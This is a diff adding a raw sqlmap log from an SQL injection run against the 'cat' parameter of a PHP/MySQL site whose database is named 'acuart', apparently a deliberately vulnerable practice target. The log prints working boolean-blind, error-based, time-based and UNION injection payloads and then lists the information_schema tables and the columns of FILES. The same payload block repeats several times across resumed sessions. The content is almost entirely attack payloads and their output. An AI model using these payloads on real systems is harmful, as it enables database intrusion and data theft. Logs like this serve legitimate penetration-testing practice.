@@ -1,0 +1,266 @@
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+Database: information_schema
+[79 tables]
++---------------------------------------+
+| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS_EXTENSIONS                    |
+| COLUMN_PRIVILEGES                     |
+| COLUMN_STATISTICS                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CACHED_INDEXES                 |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_COLUMNS                        |
+| INNODB_DATAFILES                      |
+| INNODB_FIELDS                         |
+| INNODB_FOREIGN                        |
+| INNODB_FOREIGN_COLS                   |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_INDEXES                        |
+| INNODB_METRICS                        |
+| INNODB_SESSION_TEMP_TABLESPACES       |
+| INNODB_TABLES                         |
+| INNODB_TABLESPACES                    |
+| INNODB_TABLESPACES_BRIEF              |
+| INNODB_TABLESTATS                     |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| INNODB_VIRTUAL                        |
+| KEYWORDS                              |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| RESOURCE_GROUPS                       |
+| ROLE_COLUMN_GRANTS                    |
+| ROLE_ROUTINE_GRANTS                   |
+| ROLE_TABLE_GRANTS                     |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMATA_EXTENSIONS                   |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| ST_GEOMETRY_COLUMNS                   |
+| ST_SPATIAL_REFERENCE_SYSTEMS          |
+| ST_UNITS_OF_MEASURE                   |
+| TABLESPACES                           |
+| TABLESPACES_EXTENSIONS                |
+| TABLES_EXTENSIONS                     |
+| TABLE_CONSTRAINTS                     |
+| TABLE_CONSTRAINTS_EXTENSIONS          |
+| TABLE_PRIVILEGES                      |
+| USER_ATTRIBUTES                       |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| VIEW_ROUTINE_USAGE                    |
+| VIEW_TABLE_USAGE                      |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+Database: information_schema
+Table: FILES
+[38 columns]
++----------------------+--------------+
+| Column               | Type         |
++----------------------+--------------+
+| AUTOEXTEND_SIZE      | bigint       |
+| AVG_ROW_LENGTH       | binary(0)    |
+| CHECKSUM             | binary(0)    |
+| ENGINE               | varchar(64)  |
+| EXTENT_SIZE          | bigint       |
+| INITIAL_SIZE         | bigint       |
+| ROW_FORMAT           | varchar(256) |
+| STATUS               | varchar(256) |
+| TABLE_NAME           | binary(0)    |
+| VERSION              | bigint       |
+| CHECK_TIME           | binary(0)    |
+| CREATE_TIME          | binary(0)    |
+| CREATION_TIME        | binary(0)    |
+| DATA_FREE            | bigint       |
+| DATA_LENGTH          | binary(0)    |
+| DELETED_ROWS         | binary(0)    |
+| EXTRA                | varchar(256) |
+| FILE_ID              | bigint       |
+| FILE_NAME            | text         |
+| FILE_TYPE            | varchar(256) |
+| FREE_EXTENTS         | bigint       |
+| FULLTEXT_KEYS        | binary(0)    |
+| INDEX_LENGTH         | binary(0)    |
+| LAST_ACCESS_TIME     | binary(0)    |
+| LAST_UPDATE_TIME     | binary(0)    |
+| LOGFILE_GROUP_NAME   | varchar(256) |
+| LOGFILE_GROUP_NUMBER | bigint       |
+| MAX_DATA_LENGTH      | binary(0)    |
+| MAXIMUM_SIZE         | bigint       |
+| RECOVER_TIME         | binary(0)    |
+| TABLE_CATALOG        | char(0)      |
+| TABLE_ROWS           | binary(0)    |
+| TABLE_SCHEMA         | binary(0)    |
+| TABLESPACE_NAME      | varchar(268) |
+| TOTAL_EXTENTS        | bigint       |
+| TRANSACTION_COUNTER  | binary(0)    |
+| UPDATE_COUNT         | binary(0)    |
+| UPDATE_TIME          | binary(0)    |
++----------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 3131=3131
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
